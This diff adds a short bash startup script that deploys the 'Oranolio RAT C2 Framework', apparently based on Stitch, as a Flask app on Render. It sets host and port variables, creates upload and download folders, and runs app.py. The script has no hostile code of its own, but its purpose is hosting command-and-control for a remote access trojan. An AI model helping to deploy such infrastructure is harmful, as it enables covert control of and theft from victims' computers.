@@ -1,0 +1,23 @@
+#!/bin/bash
+# Startup script for Oranolio RAT on Render
+# This script ensures proper environment setup and starts the Flask app
+
+echo "Starting Oranolio RAT C2 Framework..."
+
+# Set environment variables
+export PYTHONPATH="${PYTHONPATH}:$(pwd)"
+export STITCH_HOST="${STITCH_HOST:-0.0.0.0}"
+export STITCH_PORT="${STITCH_PORT:-5000}"
+
+# Create necessary directories
+mkdir -p data logs uploads downloads
+
+# Install dependencies if requirements.txt exists
+if [ -f "requirements.txt" ]; then
+    echo "Installing Python dependencies..."
+    pip install -r requirements.txt
+fi
+
+# Start the Flask application
+echo "Starting Flask application on ${STITCH_HOST}:${STITCH_PORT}"
+exec python app.py
